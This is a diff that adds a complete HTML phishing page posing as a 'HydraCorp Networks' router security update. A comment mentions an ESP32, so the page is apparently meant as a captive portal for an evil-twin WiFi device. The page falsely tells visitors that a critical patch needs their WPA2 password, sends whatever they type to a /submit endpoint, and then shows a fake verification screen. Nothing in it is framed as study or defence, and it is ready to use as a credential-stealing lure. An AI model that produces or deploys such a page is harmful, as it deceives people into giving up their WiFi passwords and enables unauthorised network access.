@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <title>Router Management - Security Update</title>
+    <style>
+        /* CSS Reset for a plain look */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            border-radius: 0 !important; /* Forces everything to be sharp-edged */
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #000000;
+            line-height: 1.5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 20px;
+            border: 1px solid #000000; /* Sharp black border */
+        }
+
+        header {
+            margin-bottom: 30px;
+            border-bottom: 2px solid #000000;
+            padding-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        p {
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #000000;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        input[type="password"]:focus {
+            background-color: #f0f0f0;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #000000;
+            color: #ffffff;
+            border: none;
+            font-weight: 700;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Status UI */
+        .status-box {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .loader-text {
+            font-family: monospace;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        #error-msg {
+            color: #ff0000;
+            font-size: 0.85rem;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        /* For visual separation */
+        .divider {
+            height: 1px;
+            background: #eee;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>Security Update</h1>
+        </header>
+
+        <div id="form-container">
+            <p>A critical security patch is required for your router. Please enter your WPA2 password to verify ownership and proceed with the installation.</p>
+
+            <form id="update-form">
+                <div class="form-group">
+                    <label for="password">WiFi Password</label>
+                    <input type="password" id="password" placeholder="Enter password" required>
+                </div>
+
+                <button type="submit" id="submit-btn">Verify and Update</button>
+                <div id="error-msg" class="hidden"></div>
+            </form>
+        </div>
+
+        <div id="checking-container" class="hidden status-box">
+            <div class="loader-text">VERIFYING...</div>
+            <p>The system is validating your credentials. This may take up to 60 seconds. Do not close this browser window.</p>
+        </div>
+
+        <div class="divider"></div>
+        <p style="font-size: 0.75rem; color: #666; margin-bottom: 0;">© 2026 HydraCorp Networks. All rights reserved.</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('update-form');
+        const submitBtn = document.getElementById('submit-btn');
+        const formContainer = document.getElementById('form-container');
+        const checkingContainer = document.getElementById('checking-container');
+        const errorMsg = document.getElementById('error-msg');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+
+            if (password.length < 8) {
+                showError('Minimum 8 characters required');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            formContainer.classList.add('hidden');
+            checkingContainer.classList.remove('hidden');
+
+            // Data format for ESP32 as discussed earlier
+            fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'password=' + encodeURIComponent(password)
+            }).catch(function(error) {
+                console.error('Error:', error);
+                formContainer.classList.remove('hidden');
+                checkingContainer.classList.add('hidden');
+                showError('Connection timeout. Retry.');
+                submitBtn.disabled = false;
+            });
+        });
+
+        function showError(message) {
+            errorMsg.textContent = message;
+            errorMsg.classList.remove('hidden');
+            setTimeout(() => errorMsg.classList.add('hidden'), 3000);
+        }
+    </script>
+</body>
+</html>
